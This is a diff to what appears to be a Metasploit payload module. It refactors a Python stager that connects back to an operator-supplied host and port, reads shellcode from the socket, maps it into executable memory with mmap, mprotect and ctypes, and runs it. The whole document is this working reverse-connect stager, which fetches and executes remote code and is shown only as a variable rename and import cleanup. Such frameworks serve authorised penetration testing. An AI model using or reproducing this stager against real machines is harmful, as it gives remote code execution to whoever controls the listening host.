@@ -34,7 +34,7 @@ module MetasploitModule
   end
 
   def command_string
-    %(import socket,struct,ctypes,ctypes.util,os
+    %(import socket,struct,ctypes,os
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect(('#{datastore['LHOST']}',#{datastore['LPORT']}))
 sc = b'\\xbf'+struct.pack('<L', s.fileno())
@@ -54,14 +54,15 @@ if os.name == 'nt':
   ctypes.CFUNCTYPE(ctypes.c_int)(ptr)()
 else:
   import mmap
+  from ctypes.util import find_library
   sc += s.recv(4096)
-  l = ctypes.CDLL(ctypes.util.find_library('c'))
-  l.mmap.restype = ctypes.c_void_p
-  m = l.mmap(0,len(sc),mmap.PROT_READ|mmap.PROT_WRITE,mmap.MAP_ANONYMOUS|mmap.MAP_PRIVATE,-1,0)
-  ctypes.memmove(m,sc,len(sc))
-  l.mprotect.argtypes = [ctypes.c_void_p,ctypes.c_int,ctypes.c_int]
-  l.mprotect(m,len(sc),mmap.PROT_READ|mmap.PROT_EXEC)
-  ctypes.CFUNCTYPE(ctypes.c_int)(m)()
+  c = ctypes.CDLL(find_library('c'))
+  c.mmap.restype = ctypes.c_void_p
+  ptr = c.mmap(0,len(sc),mmap.PROT_READ|mmap.PROT_WRITE,mmap.MAP_ANONYMOUS|mmap.MAP_PRIVATE,-1,0)
+  ctypes.memmove(ptr,sc,len(sc))
+  c.mprotect.argtypes = [ctypes.c_void_p,ctypes.c_int,ctypes.c_int]
+  c.mprotect(ptr,len(sc),mmap.PROT_READ|mmap.PROT_EXEC)
+  ctypes.CFUNCTYPE(ctypes.c_int)(ptr)()
 )
   end
 
